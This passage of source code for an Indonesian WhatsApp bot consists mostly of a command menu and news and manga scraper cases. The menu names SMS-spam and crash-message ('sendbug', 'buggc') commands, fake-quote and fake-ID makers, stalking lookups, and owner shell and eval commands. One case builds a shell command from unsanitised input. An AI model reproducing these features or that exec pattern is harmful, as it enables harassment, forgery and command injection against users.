key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage' : { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname}, ;;;\nFN:${pushname}, \nitem1.TEL;waid=${sender.split("@")[0]}:${sender.split("@")[0]}\nitem1.X-ABLabel:creator\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./lib/image/fino.jpeg')}}}
imeg = await hexa.prepareMessage(from, fs.readFileSync('./lib/image/cecan.jpeg'), 'imageMessage')
imeu = imeg.message.imageMessage
hexa.relayWAMessage(await hexa.prepareMessageFromContent(from, {productMessage: {
businessOwnerJid: '628821086429858@s.whatsapp.net',
product: {
productId: '2021',
productImage:imeu,
title: `🔥press 'LIHAT' to see the menu🔥`,
description: `                   🌏  Ǐ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜  🌍\n\n                  菲諾·朱利安·安加拉\n\n${ucapanWaktu} @${sender.split("@")[0]}
\`\`\`⛃⃝🔖Prefix : [ 𝙼𝚄𝙻𝚃𝙸-𝙿𝚁𝙴𝙵𝙸𝚇 ]\`\`\`
\`\`\`⛃⃝⚙️Status : [ ${banChats == 'true' ? 'PUBLIC' : 'SELF'} ]\`\`\`
\`\`\`⛃⃝⏳Activate : [ ${kyun(run)} ]\`\`\`
\`\`\`⛃⃝🔋Baterai : [ ${baterai.baterai}% ${baterai.cas === 'true' ? 'Charge':'No Charge'} ]\`\`\`
\`\`\`⛃⃝🧾Lib : [ BAILEYS ]\`\`\`
\`\`\`⛃⃝🗒️Language : [ JavaScript]*\`\`\`
\`\`\`⛃⃝📱Device : [ ${device_manufacturer} ]\`\`\`
\`\`\`⛃⃝🙋Owner : [ @${nomor.split("@")[0]} ]\`\`\`

                     ⛃⃝🌏DATE
                      
        \`\`\`⛃⃝🌟 ${ucapanWaktu}\`\`\`
      \`\`\`⛃⃝🗞️ ${time} WIB\`\`\`
   \`\`\`⛃⃝🗞️ ${wit} WIT\`\`\`
\`\`\`⛃⃝🗞️ ${wita} WITA\`\`\`


More??....${readmore}    

		*[ INSTAGRAM TOOLS ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}igfollow_
┣ ◩ _${prefix}igunfollow_
┣ ◩ _${prefix}iglike_
┣ ◩ _${prefix}iglike_
┣ ◩ _${prefix}igcomment_
┣ ◩ _${prefix}igimage_
┣ ◩ _${prefix}upinstastory_
┣ ◩ _${prefix}upfeed_
┣ ◩ _${prefix}block_
┣ ◩ _${prefix}unblock_
┣ ◩ _${prefix}igsavepost_
┣ ◩ _${prefix}igunsvpost
┗━━━━━━━━ ❑


		*[ 𝙼𝙰𝙺𝙴𝚁 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}sticker_
┣ ◩ _${prefix}swm_ <author|packname>
┣ ◩ _${prefix}take_ <author|packname>
┣ ◩ _${prefix}fdeface_
┣ ◩ _${prefix}ttp_
┣ ◩ _${prefix}ttp2
┣ ◩ _${prefix}ttp3_
┣ ◩ _${prefix}ttp4_
┣ ◩ _${prefix}fakedonald_
┣ ◩ _${prefix}ktpmaker_
┣ ◩ _${prefix}smoji_ <emoji>
┣ ◩ _${prefix}smoji2_ <emoji>
┣ ◩ _${prefix}wasted_ 
┣ ◩ _${prefix}triggered_
┗━━━━━━━━ ❑


     *[ 𝙲𝙾𝙽𝚅𝙴𝚁𝚃 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}toimg_
┣ ◩ _${prefix}tomp3_
┣ ◩ _${prefix}tomp4_
┣ ◩ _${prefix}slow_
┣ ◩ _${prefix}fast_
┣ ◩ _${prefix}reverse_
┣ ◩ _${prefix}tourl_
┗━━━━━━━━ ❑

   *[ 𝙶𝙴𝚃 𝙸𝙼𝙶, 𝚅𝙽, 𝚂𝚃𝙸𝙺 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}getvn_
┣ ◩ _${prefix}listvn_
┣ ◩ _${prefix}getstik_
┣ ◩ _${prefix}liststik_
┣ ◩ _${prefix}getimg_
┣ ◩ _${prefix}listimg
┗━━━━━━━━ ❑

   *[ 𝙶𝙰𝙼𝙴 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}slot_ (Dalam perbaikan)
┣ ◩ _${prefix}tictacto_ (Dalam perbaikan)
┗━━━━━━━━ ❑

     *[ 𝟏𝟖+ 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}xhamster_
┣ ◩ _${prefix}xhamstersearch_ <query>
┣ ◩ _${prefix}xnxx_
┣ ◩ _${prefix}xnxxsearch_ <query>
┣ ◩ _${prefix}nhentai_
┣ ◩ _${prefix}nhentaisearch_ < kode >
┣ ◩ _${prefix}nhentaipdf_
┣ ◩ _${prefix}nekopoi_
┣ ◩ _${prefix}nekopoisearch_ <query>
┗━━━━━━━━ ❑


 *[ 𝚁𝙰𝙽𝙳𝙾𝙼 𝙸𝙼𝙰𝙶𝙴 & 𝙼𝙰𝙺𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}18+image_
┣ ◩ _${prefix}18+image2_
┣ ◩ _${prefix}textpro_
┣ ◩ _${prefix}textpro2_
┣ ◩ _${prefix}logomaker_
┣ ◩ _${prefix}ephoto_
┗━━━━━━━━ ❑ 


     *[ 𝙰𝙽𝙸𝙼𝙴 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}art_
┣ ◩ _${prefix}bts_
┣ ◩ _${prefix}exo_
┣ ◩ _${prefix}elf_
┣ ◩ _${prefix}loli_
┣ ◩ _${prefix}neko_
┣ ◩ _${prefix}waifu_
┣ ◩ _${prefix}shota_
┣ ◩ _${prefix}husbu_
┣ ◩ _${prefix}sagiri_
┣ ◩ _${prefix}shinobu_
┣ ◩ _${prefix}megumin_
┣ ◩ _${prefix}wallnime_
┣ ◩ _${prefix}character_
┣ ◩ _${prefix}manga_
┣ ◩ _${prefix}kusonime_
┣ ◩ _${prefix}kusonimesearch_ <query>
┣ ◩ _${prefix}otakudesu_
┣ ◩ _${prefix}otakudesusearch_ <query>
┣ ◩ _${prefix}anime_
┣ ◩ _${prefix}pixiv_
┣ ◩ _${prefix}pixivdl_
┣ ◩ _${prefix}chara_
┣ ◩ _${prefix}otaku_
┗━━━━━━━━ ❑


      *[ 𝙾𝚃𝙷𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}playstore_
┣ ◩ _${prefix}playstore2_
┣ ◩ _${prefix}shopee_
┣ ◩ _${prefix}infofilm_
┣ ◩ _${prefix}lk21_
┣ ◩ _${prefix}ssweb_
┣ ◩ _${prefix}shortlink_
┣ ◩ _${prefix}ssweb2_
┣ ◩ _${prefix}ceritahoror_ <random>
┣ ◩ _${prefix}wattpad_
┣ ◩ _${prefix}wattpadsearch_ <query>
┣ ◩ _${prefix}drakorongoing_
┣ ◩ _${prefix}covidindo_
┣ ◩ _${prefix}covidglobal_
┣ ◩ _${prefix}asupan_ <random>
┣ ◩ _${prefix}wancak_
┣ ◩ _${prefix}faketoko_
┣ ◩ _${prefix}cuaca_
┣ ◩ _${prefix}infogempa_
┣ ◩ _${prefix}cnninternasional_
┣ ◩ _${prefix}cnnnasional_
┣ ◩ _${prefix}cnnindonesia_
┣ ◩ _${prefix}newsinfo_
┣ ◩ _${prefix}cerpen_
┣ ◩ _${prefix}stickerwa_ <query>
┣ ◩ _${prefix}google_ <query
┣ ◩ _${prefix}lirik_
┣ ◩ _${prefix}lirik2_
┣ ◩ _${prefix}kbbi_
┣ ◩ _${prefix}wikipedia_
┣ ◩ _${prefix}jadwaltv_
┣ ◩ _${prefix}jadwaltvnow_
┣ ◩ _${prefix}jadwalbola_
┣ ◩ _${prefix}kodepos_ <query>
┣ ◩ _${prefix}telesticker_
┗━━━━━━━━ ❑


     *[ 𝙶𝚁𝙾𝚄𝙿 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}antibule_
┣ ◩ _${prefix}antihidetag_
┣ ◩ _${prefix}antiviewonce_
┣ ◩ _${prefix}group_ (open/close)
┣ ◩ _${prefix}add_
┣ ◩ _${prefix}kick_
┣ ◩ _${prefix}demote_
┣ ◩ _${prefix}promote_
┣ ◩ _${prefix}add2_
┣ ◩ _${prefix}kick2_
┣ ◩ _${prefix}demote2_
┣ ◩ _${prefix}promote2_
┣ ◩ _${prefix}tagall_
┣ ◩ _${prefix}tagall2_
┣ ◩ _${prefix}tagall3_
┣ ◩ _${prefix}tagall4_
┣ ◩ _${prefix}tagall5_
┣ ◩ _${prefix}hidetag_
┣ ◩ _${prefix}grup_ (open/close)
┣ ◩ _${prefix}closegc_
┣ ◩ _${prefix}opengc_
┗━━━━━━━━ ❑

    *[ 𝙸𝚂𝙻𝙰𝙼 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}asmaulhusna_ <query>
┣ ◩ _${prefix}kisahnabi_ <query>
┣ ◩ _${prefix}jadwalsholat_ <query>
┣ ◩ _${prefix}alquran_
┣ ◩ _${prefix}alquranaudio_
┣ ◩ _${prefix}listsurah_
┗━━━━━━━━ ❑


    *[ 𝚄𝙿𝚂𝚆 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}upswteks_
┣ ◩ _${prefix}upswimage_
┣ ◩ _${prefix}upswvideo_
┣ ◩ _${prefix}upswlokasi_
┣ ◩ _${prefix}upswaudio_
┣ ◩ _${prefix}upswvoice_
┣ ◩ _${prefix}upswsticker_
┗━━━━━━━━ ❑

    *[ 𝙵𝚄𝙽 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}fitnah_
┣ ◩ _${prefix}fitnahpc_
┣ ◩ _${prefix}kontak_
┗━━━━━━━━ ❑

    *[ 𝚃𝙰𝙶 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}hidetag_
┣ ◩ _${prefix}kontag_
┣ ◩ _${prefix}sticktag_
┣ ◩ _${prefix}totag_
┗━━━━━━━━ ❑

  *[ 𝚂𝚃𝙰𝙻𝙺𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}igstalk_ <query>
┣ ◩ _${prefix}tiktokstalk_ <query>
┣ ◩ _${prefix}githubstalk_ <query>
┣ ◩ _${prefix}twitterstalk_ <query>
┗━━━━━━━━ ❑

     *[ 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}ytsearch_ <query>
┣ ◩ _${prefix}play_ <query>
┣ ◩ _${prefix}spotify_ <quert>
┣ ◩ _${prefix}spotifysearch_ <query>
┣ ◩ _${prefix}joox_ <query>
┣ ◩ _${prefix}jooxsearch_ <query>
┣ ◩ _${prefix}video_ <query>
┣ ◩ _${prefix}ytmp3_ <link>
┣ ◩ _${prefix}igvideo_ <link>
┣ ◩ _${prefix}igdl_ <link>
┣ ◩ _${prefix}igdl2_ <link>
┣ ◩ _${prefix}igstory_ <username>
┣ ◩ _${prefix}igimage_ <link>
┣ ◩ _${prefix}igaudio_ <link>
┣ ◩ _${prefix}ytmp4_ <link>
┣ ◩ _${prefix}ig_ <link>
┣ ◩ _${prefix}pinterest_
┣ ◩ _${prefix}pinterest2_
┣ ◩ _${prefix}pinterest3_
┣ ◩ _${prefix}pinterestdl_
┣ ◩ _${prefix}twitter_ <link>
┣ ◩ _${prefix}twtdl_
┣ ◩ _${prefix}tiktok_ <link>
┣ ◩ _${prefix}tiktokvideo_ <link>
┣ ◩ _${prefix}tiktokaudio_ <link>
┣ ◩ _${prefix}fb_ <link>
┣ ◩ _${prefix}brainly_ <query>
┣ ◩ _${prefix}image_ <query>
┣ ◩ _${prefix}anime_ <random>
┗━━━━━━━━ ❑

    *[ 𝙾𝚆𝙽𝙴𝚁 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}spamsms_
┣ ◩ _${prefix}sendbug_
┣ ◩ _${prefix}sendbug2_
┣ ◩ _${prefix}buggc_
┣ ◩ _${prefix}owner_
┣ ◩ _${prefix}stat_ 
┣ ◩ _${prefix}off_
┣ ◩ _${prefix}on_
┣ ◩ _${prefix}status_
┣ ◩ _${prefix}self_
┣ ◩ _${prefix}public_
┣ ◩ _${prefix}setthumb_
┣ ◩ _${prefix}settarget_
┣ ◩ _${prefix}setfakeimg_
┣ ◩ _${prefix}setreply_
┣ ◩ _${prefix}ping_
┣ ◩ _${prefix}inspect_
┣ ◩ _${prefix}join_
┣ ◩ _${prefix}get_
┣ ◩ _${prefix}term_ <code>
┣ ◩ _x_ < java script code >
┗━━━━━━━━ ❑\n[ Thanks To ]${readmore}\n•Hexagonz\n•Baileys\n•My Friend\n•Kevin gay\n•Manurios\n•Agung ngentod\n•Hans\n•Hans`,
currencyCode: 'IDR',
priceAmount1000: `2021`,
retailerId: '0507',
url: 'https://wa.me/62895349917040',
productImageCount: 5,
salePriceAmount1000: '7.8000'}}},
{quoted:fvideo, sendEphemeral:true, contextInfo: { "forwardingScore":999999, "isForwarded":true, mentionedJid: [nomor,sender], externalAdReply: { title: 'ìąʍ ƒìղօ 菲诺', body : '🧿Follow my instagram,click here!🧿', mediaType: 2, thumbnail: fs.readFileSync('./lib/image/cecan.jpeg'), sourceUrl: 'instagram.com/finoooooo_'}}}))
break
case 'tq': case 'colong':
			if (!isQuotedSticker) return reply(`Reply Sticker With Caption*${prefix}Colong*`)
			const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			const meidia = await hexa.downloadAndSaveMediaMessage(encmediia, `./stik/${sender}`)
			exec(`webpmux -set exif ./stik/data.exif .stik/${sender}.webp -o ./stik/${sender}.webp`, async (error) => {
			hexa.sendMessage(from, fs.readFileSync(`./stik/${sender}.webp`), "stickerMessage")
			fs.unlinkSync(meidia)
			})
			break
case 'setexif':
nm = body.slice(9)
			if (args.length < 1) return reply(`Example ${prefix}exif Name|Autho`)
			if (!nm.split('|')) return reply(`Example ${prefix}exif Name|Autho`)
		createExif(nm.split('|')[0], nm.split('|')[1], `./stik/data.exif`)
			reply(mess.succes)
break
//------ Dehan api full case -------\\
case 'komiku-search':
						if (!q) return reply('Mau cari apa?');
							KomikuSearch(q).then(async(res)=> {
								buff = await getBuffer(res[0].manga_thumb);
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•";
								teks += `\nManga: ${res[0].manga}\n`;
								teks += `Description: ${res[0].manga_desc}\n`;
								teks += `Chapter Pertama: ${res[0].chapter.pertama}\n`;
								teks += `Chapter Terbaru: ${res[0].chapter.terbaru}\n`;
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•";
								hexa.sendImageCaption(from, buff, mek, teks);
							});
							break;
					case 'mangaku-search':
						if (!q) return reply('Mau cari apa?')
							MangakuSearch(q).then(async(res) => {
								buff = await getBuffer(res[0].manga_thumb)
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								teks += `\nManga: ${res[0].manga_name}\n`
								teks += `Manga Eps: ${res[0].manga_eps}\n`
								teks += `Manga Rating: ${res[0].manga_rating}\n`
								teks += `•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•`
								hexa.sendImageCaption(from, buff, mek, teks)
							})
							break
					case 'klikmanga-search':
						if (!q) return reply('Mau cari apa?')
							KlikMangaSearch(q).then(async(res) => {
							no = 0
							for (let i of res) {
								no += 1
								buff = await getBuffer(i.manga_thumb)
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								teks += `\n• Urutan: ${no.toString()} •\n`
								teks += `Manga: ${i.manga_name}\n`
								teks += `Description: ${i.manga_desc}\n`
								teks += `Statues: ${i.manga_status}\n`
								teks += `Release: ${i.manga_release}\n`
								teks += `Genre's: ${i.manga_genre}\n`
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								hexa.sendImageCaption(from, buff, mek, teks)
							}
							})
							break
					case 'cnn-news':
						CNNNews().then(res => {
							no = 0
							teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
							for (let i of res) {
								no += 1
								teks += `\n• ${no.toString()} •\n`
								teks += `Berita: ${i.berita}\n`
								teks += `Link: ${i.berita_url}\n`
							}
							teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
							reply(from, teks, mek)
						})
						break
						case 'layarkaca-search':
							if (!q) return reply(from, "Film?", mek)
							LayarKaca21(q).then(async(res) => {
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
								  no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Film: ${i.film_title}\n`
									teks += `Link: ${i.film_link}\n`
								}
								teks += `•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•`
								reply(from, teks, mek)
							})
							break
						case 'palingmurah-search':
							if (!q) return reply(from, 'vps?, rdp?', mek)
							PalingMurah(q).then(async(res) => {
								no = 0
								for (let i of res) {
									no += 1
									buff = await getBuffer(i.product_image)
									teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
									teks += `\n• ${no.toString()} •\n`
									teks += `Product: ${i.product}\n`
									teks += `Description: ${i.product_desc}\n`
									teks += `Price: ${i.price}\n`
									teks += `Link: ${i.product_url}\n`
									teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
									await hexa.sendImageCaption(from, buff, mek, teks)
								}
							})
							break
						case 'cnbc-news':
							CNBCNews().then(async(res) => {
								buff = await getBuffer(res[0].berita_thumb)
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Berita: ${i.berita}\n`
									teks += `Upload: ${i.berita_diupload}\n`
									teks += `Link: ${i.berita_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								hexa.sendImageCaption(from, buff, mek, teks)
							})
							break
						case 'tribun-news':
							TribunNews().then(async(res) => {
								buff = await getBuffer(res[0].berita_thumb)
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Berita: ${i.berita}\n`
									teks += `Upload: ${i.berita_diupload}\n`
									teks += `Jenis: ${i.berita_jenis}\n`
									teks += `Link: ${i.berita_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								hexa.sendImageCaption(from, buff, mek, teks)
							})
							break
						case 'indozone-news':
							IndozoneNews().then(async(res) => {
								buff = await getBuffer(res[0].berita_thumb)
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Berita: ${i.berita}\n`
									teks += `Upload: ${i.berita_diupload}\n`
									teks += `Jenis: ${i.berita_jenis}\n`
									teks += `Link: ${i.berita_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								hexa.sendImageCaption(from, buff, mek, teks)
							})
							break
						case 'kumparan-news':
							KumparanNews().then(async(res) => {
								buff = await getBuffer(res[0].berita_thumb)
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Berita: ${i.berita}\n`
									teks += `Upload: ${i.berita_diupload}\n`
									teks += `Link: ${i.berita_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								hexa.sendImageCaption(from, buff, mek, teks)
							})
							break
						case 'kompas-news':
							KompasNews().then(async(res) => {
								buff = await getBuffer(res[0].berita_thumb)
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Berita: ${i.berita}\n`
									teks += `Upload: ${i.berita_diupload}\n`
									teks += `Jenis: ${i.berita_jenis}\n`
									teks += `Link: ${i.berita_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								hexa.sendImageCaption(from, buff, mek, teks)
							})
							break
						case 'detik-news':
							DetikNews().then(async(res) => {
								buff = await getBuffer(res[0].berita_thumb)
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Berita: ${i.berita}\n`
									teks += `Upload: ${i.berita_diupload}\n`
									teks += `Link: ${i.berita_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								hexa.sendImageCaption(from, buff, mek, teks)
							})
							break
						case 'daily-news':
							DailyNews().then(async(res) => {
								buff = await getBuffer(res[0].berita_thumb)
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Berita: ${i.berita}\n`
									teks += `Link: ${i.berita_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								hexa.sendImageCaption(from, buff, mek, teks)
							})
							break
						case 'metro-news':
							metroNews().then(async(res) => {
								buff = await getBuffer(res[0].berita_thumb)
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Berita: ${i.berita}\n`
									teks += `Link: ${i.berita_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								hexa.sendImageCaption(from, buff, mek, teks)
							})
							break
						case 'inews-news':
							iNews().then(async(res) => {
								buff = await getBuffer(res[0].berita_thumb)
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Berita: ${i.berita}\n`
									teks += `Upload: ${i.berita_diupload}\n`
									teks += `Jenis: ${i.berita_jenis}\n`
									teks += `Link: ${i.berita_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								hexa.sendImageCaption(from, buff, mek, teks)
							})
							break
						case 'okezone-news':
							OkezoneNews().then(async(res) => {
								buff = await getBuffer(res[0].berita_thumb)
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Berita: ${i.berita}\n`
									teks += `Upload: ${i.berita_diupload}\n`
									teks += `Link: ${i.berita_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								hexa.sendImageCaption(from, buff, mek, teks)
							})
							break
						case 'fajar-news':
							FajarNews().then(async(res) => {
								buff = await getBuffer(res[0].berita_thumb)
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Berita: ${i.berita}\n`
									teks += `Upload: ${i.berita_diupload}\n`
									teks += `Jenis: ${i.berita_jenis}\n`
									teks += `Link: ${i.berita_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								hexa.sendImageCaption(from, buff, mek, teks)
							})
							break
						case 'sindo-news':
							SindoNews().then(async(res) => {
								buff = await getBuffer(res[0].berita_thumb)
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Berita: ${i.berita}\n`
									teks += `Jenis: ${i.berita_jenis}\n`
									teks += `Link: ${i.berita_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								hexa.sendImageCaption(from, buff, mek, teks)
							})
							break
						case 'tempo-news':
							TempoNews().then(async(res) => {
								buff = await getBuffer(res[0].berita_thumb)
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Berita: ${i.berita}\n`
									teks += `Upload: ${i.berita_diupload}\n`
									teks += `Link: ${i.berita_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								hexa.sendImageCaption(from, buff, mek, teks)
							})
							break
						case 'antara-news':
							AntaraNews().then(async(res) => {
								buff = await getBuffer(res[0].berita_thumb)
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Berita: ${i.berita}\n`
									teks += `Upload: ${i.berita_diupload}\n`
									teks += `Jenis: ${i.berita_jenis}\n`
									teks += `Link: ${i.berita_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								hexa.sendImageCaption(from, buff, mek, teks)
							})
							break
						case 'republika-news':
							RepublikaNews().then(async(res) => {
								buff = await getBuffer(res[0].berita_thumb)
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Berita: ${i.berita}\n`
									teks += `Upload: ${i.berita_diupload}\n`
									teks += `Jenis: ${i.berita_jenis}\n`
									teks += `Link: ${i.berita_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								hexa.sendImageCaption(from, buff, mek, teks)
							})
							break
						case 'animeplanet-search':
							if (!q) return reply('Mau cari apa?')
							AniPlanetSearch(q).then(async(res) => {
								no = 0
								for (let i of res) {
									no += 1
									teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
									buff = await getBuffer(i.manga_thumb)
									teks += `\n• Urutan: ${no.toString()} •\n`
									teks += `Manga: ${i.manga_name}\n`
									teks += `Link: ${i.manga_url}\n`
									teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
									hexa.sendImageCaption(from, buff, mek, teks)
								}
							})
							break
						case 'komikfox-search':
							if (!q) return reply('Mau cari apa?')
							KomikFoxSearch(q).then(async(res) => {
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• Urutan: ${no.toString()} •\n`
									teks += `Manga: ${i.manga_name}\n`
									teks += `Release: ${i.manga_release}\n`
									teks += `Link: ${i.manga_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								reply(from, teks, mek)
							})
							break
						case 'komikstation-search':
							if (!q) return reply('Mau cari apa?')
							KomikStationSearch(q).then(async(res) => {
								no = 0
								for (let i of res) {
									no += 1
									buff = await getBuffer(i.manga_thumb)
									teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
									teks += `\n• Urutan: ${no.toString()} •\n`
									teks += `Manga: ${i.manga_name}\n`
									teks += `Chapter: ${i.manga_eps}\n`
									teks += `Link ${i.manga_url}\n`
									teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
									hexa.sendImageCaption(from, buff, mek, teks)
								}
							})
							break
						case 'kiryuu-search':
							if (!q) return reply('Mau cari apa?')
							KiryuuSearch(q).then(async(res) => {
								no = 0
								for (let i of res) {
									no += 1
									buff = await getBuffer(i.manga_thumb)
									teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
									teks += `\n• Urutan: ${no.toString()} •\n`
									teks += `Manga: ${i.manga_name}\n`
									teks += `Rating: ${i.manga_rating}\n`
									teks += `Chapter: ${i.manga_eps}\n`
									teks += `Link: ${i.manga_url}\n`
									teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
									hexa.sendImageCaption(from, buff, mek, teks)
								}
							})
							break
						case 'kissmanga-search':
							if (!q) return reply('Mau cari apa?')
							KissMangaSearch(q).then(async(res)=>{
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• Urutan: ${no.toString()} •\n`
									teks += `Manga: ${i.manga_name}\n`
									teks += `Link: ${i.manga_url}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								reply(from, teks, mek)
							})
							break
						case 'aminoapps-search':
							if (!q) return reply('Mau cari apa?')
							AminoApps(q).then(res => {
								no = 0
								teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								for (let i of res) {
									no += 1
									teks += `\n• ${no.toString()} •\n`
									teks += `Community: ${i.community}\n`
									teks += `Desc: ${i.community_desc}\n`
									teks += `Link: ${i.community_link}\n`
								}
								teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
								reply(from, teks, mek)
							})
							break
						case "mangatoon-search":
if (!q) return reply('Mau cari apa?')
						  Mangatoon(q).then(async (res) => {
						    no = 0
						    for (let i of res) {
						      buff = await getBuffer(i.comic_thumb)
						      no += 1
						      teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
						      teks += `\n• Urutan: ${no.toString()} •\n`
						      teks += `Comic: ${i.comic_name}\n`
